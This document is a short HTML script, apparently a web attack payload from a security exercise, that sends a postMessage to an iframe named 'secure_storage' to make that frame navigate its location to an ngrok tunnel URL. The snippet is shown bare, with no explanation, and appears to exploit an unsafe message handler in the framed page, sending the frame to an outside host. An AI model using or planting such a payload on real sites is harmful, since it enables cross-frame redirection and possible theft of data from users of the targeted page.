<script defer>
    let storage = document.getElementById("secure_storage");
    storage.contentWindow.postMessage(["window.document.location", "http://99a5f19968d9.ngrok.io?test"], storage.src);
</script>